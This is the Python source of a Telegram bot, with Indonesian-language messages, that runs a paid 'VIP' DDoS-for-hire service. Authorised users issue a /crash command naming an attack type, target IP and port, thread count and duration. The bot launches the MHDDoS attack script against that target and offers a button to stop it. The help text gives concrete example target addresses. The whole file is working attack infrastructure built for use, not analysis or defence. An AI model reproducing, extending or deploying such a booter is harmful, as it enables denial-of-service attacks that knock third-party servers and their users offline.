import telebot
import subprocess
import sqlite3
from datetime import datetime, timedelta
from threading import Lock
import time
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton

BOT_TOKEN = "TOKEN AQUI"
ADMIN_ID = 7178876305
START_PY_PATH = "/workspaces/MHDDoS/start.py"

bot = telebot.TeleBot(BOT_TOKEN)
db_lock = Lock()
cooldowns = {}
active_attacks = {}

conn = sqlite3.connect("users.db", check_same_thread=False)
cursor = conn.cursor()
cursor.execute(
    """
    CREATE TABLE IF NOT EXISTS vip_users (
        id INTEGER PRIMARY KEY,
        telegram_id INTEGER UNIQUE,
        expiration_date TEXT
    )
    """
)
conn.commit()


@bot.message_handler(commands=["start"])
def handle_start(message):
    telegram_id = message.from_user.id

    with db_lock:
        cursor.execute(
            "SELECT expiration_date FROM vip_users WHERE telegram_id = ?",
            (telegram_id,),
        )
        result = cursor.fetchone()


    if result:
        expiration_date = datetime.strptime(result[0], "%Y-%m-%d %H:%M:%S")
        if datetime.now() > expiration_date:
            vip_status = "✘ *RENCANA VIP ANDA TELAH KADALUARSA.*"
        else:
            dias_restantes = (expiration_date - datetime.now()).days
            vip_status = (
                f"♛ PELANGGAN VIP!\n"
                f"♟ Hari Yang Tersisa: {dias_restantes} dia(s)\n"
                f"♞ Habis Masa Berlaku: {expiration_date.strftime('%d/%m/%Y %H:%M:%S')}"
            )
    else:
        vip_status = "✘ *Anda Tidak Memiliki Paket Vip Aktif.*"
    markup = InlineKeyboardMarkup()
    button = InlineKeyboardButton(
        text="⌘ DanssRmdn_ ⌘",
        url=f"tg://user?id={ADMIN_ID}"

    )
    markup.add(button)
    
    bot.reply_to(
        message,
        (
            "☣ *DDOS SERVER SIGNAL 999+*"
            

            f"""
```
{vip_status}```\n"""
            "♛ *CARA MENGGUNAKAN:*"
            """
```
/crash <TYPE> <IP/HOST:PORT> <THREADS> <MS>```\n"""
            "♚ *CONTOH:*"
            """
```
/crash UDP 143.92.125.230:10013 10 900```\n"""
            "☛ DanssRmdn_ OWNER VVIP ☚"
        ),
        reply_markup=markup,
        parse_mode="Markdown",
    )


@bot.message_handler(commands=["vip"])
def handle_addvip(message):
    if message.from_user.id != ADMIN_ID:
        bot.reply_to(message, "✘ ANDA BUKAN OWNER RESMI, HaHaHa Lawak Lo🗿😂. Hubungi @Danssrmdn")
        return

    args = message.text.split()
    if len(args) != 3:
        bot.reply_to(
            message,
            "✘ FORMAT TIDAK VALID. Gunakan: `/vip <ID> <HARI>`",
            parse_mode="Markdown",
        )
        return

    telegram_id = args[1]
    days = int(args[2])
    expiration_date = (datetime.now() + timedelta(days=days)).strftime("%Y-%m-%d %H:%M:%S")

    with db_lock:
        cursor.execute(
            """
            INSERT OR REPLACE INTO vip_users (telegram_id, expiration_date)
            VALUES (?, ?)
            """,
            (telegram_id, expiration_date),
        )
        conn.commit()

    bot.reply_to(message, f"✔ Pengguna {telegram_id} Di Tambahkan Sebagai Vip Selama {days} Hari.")


@bot.message_handler(commands=["crash"])
def handle_ping(message):
    telegram_id = message.from_user.id

    with db_lock:
        cursor.execute(
            "SELECT expiration_date FROM vip_users WHERE telegram_id = ?",
            (telegram_id,),
        )
        result = cursor.fetchone()

    if not result:
        bot.reply_to(message, "✘ LU SIAPA ANJ!!? Anda Tidak Memiliki Ijin Menggunakan Perintah ini @Danssrmdn.")
        return

    expiration_date = datetime.strptime(result[0], "%Y-%m-%d %H:%M:%S")
    if datetime.now() > expiration_date:
        bot.reply_to(message, "✘ AKSES VIP ANDA TELAH KADALUARSA 😂. Ingin Mendapatkan Akses VIP Lagi? Hubungi @Danssrmdn")
        return

    if telegram_id in cooldowns and time.time() - cooldowns[telegram_id] < 10:
        bot.reply_to(message, "✘ Tunggu 10 Detik Sebelum Memulai Serangan Lain dan Ingatlah Untuk Menghentikan Serangan Sebelumnya.")
        return

    args = message.text.split()
    if len(args) != 5 or ":" not in args[2]:
        bot.reply_to(
            message,
            (
                "✘ *FORMAT TIDAK VALID ANJ!!🗿!*\n\n"
                "♛ *Penggunaan Yang Benar!!:*\n"
                "`/crash <TYPE> <IP/HOST:PORT> <THREADS> <MS>`\n\n"
                "♚ *CONTOH:*\n"
                "`/crash UDP 124.158.135.39:10016 10 900`"
            ),
            parse_mode="Markdown",
        )
        return

    attack_type = args[1]
    ip_port = args[2]
    threads = args[3]
    duration = args[4]
    command = ["python", START_PY_PATH, attack_type, ip_port, threads, duration]

    process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    active_attacks[telegram_id] = process
    cooldowns[telegram_id] = time.time()

    markup = InlineKeyboardMarkup()
    markup.add(InlineKeyboardButton("🛑✋ HENTIKAN SERANGAN ASUI", callback_data=f"stop_{telegram_id}"))

    bot.reply_to(
        message,
        (
            "*[🚀] SERANGAN DI MULAI- 200 [🚀]*\n\n"
            f"ᯤ *Alamat Ip&Port:* {ip_port}\n"
            f"⚙︎ *Tipe Serangan:* {attack_type}\n"
            f"×͜× *Threads:* {threads}\n"
            f"⏱ *Waktu Serangan (ms):* {duration}\n\n"
            f"☛ DanssRmdn_ ☹☠︎︎ OWNER VVIP ☚"
        ),
        reply_markup=markup,
        parse_mode="Markdown",
    )


@bot.callback_query_handler(func=lambda call: call.data.startswith("stop_"))
def handle_stop_attack(call):
    telegram_id = int(call.data.split("_")[1])

    if call.from_user.id != telegram_id:
        bot.answer_callback_query(
            call.id, "✘ Hanya Pengguna Yang Dapat Memulai Tindakan/Yang Bisa Melakunnya."
        )
        return

    if telegram_id in active_attacks:
        process = active_attacks[telegram_id]
        process.terminate()
        del active_attacks[telegram_id]

        bot.answer_callback_query(call.id, "✔ SERANGAN BERHASIL DI HENTIKAN.")
        bot.edit_message_text(
            "*[⚠] SERANGAN SELESAI[⚠]*",
            chat_id=call.message.chat.id,
            message_id=call.message.id,
            parse_mode="Markdown",
        )
        time.sleep(3)
        bot.delete_message(chat_id=call.message.chat.id, message_id=call.message.id)
    else:
        bot.answer_callback_query(call.id, "✘ Tidak Ada Serangan Yang di Temukan, Lanjutkan Tindakan Anda.")

if __name__ == "__main__":
    bot.infinity_polling()
